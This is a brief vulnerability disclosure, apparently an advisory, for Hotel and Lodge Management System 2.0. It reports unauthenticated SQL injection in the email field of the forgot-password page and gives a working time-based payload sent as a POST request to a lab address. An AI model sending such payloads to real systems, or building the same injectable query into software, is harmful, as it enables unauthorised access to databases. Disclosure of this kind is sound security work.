HOTEL AND LODGE MANAGEMENT SYSTEM 2.0 SQLI

Disclosure date: 10/24/19

Hotel and Lodge Management System is vulnerable to unauthenticated SQL injection and can allow remote attackers to execute arbitrary SQL commands via the 'Email'.

Proof of Concept:

http://192.168.234.128/forgot_password.php

POST:btn_forgot=1&email=1' or sleep(5)%23

![Image text](1.jpg)
![Image text](2.jpg)
![Image text](3.jpg)
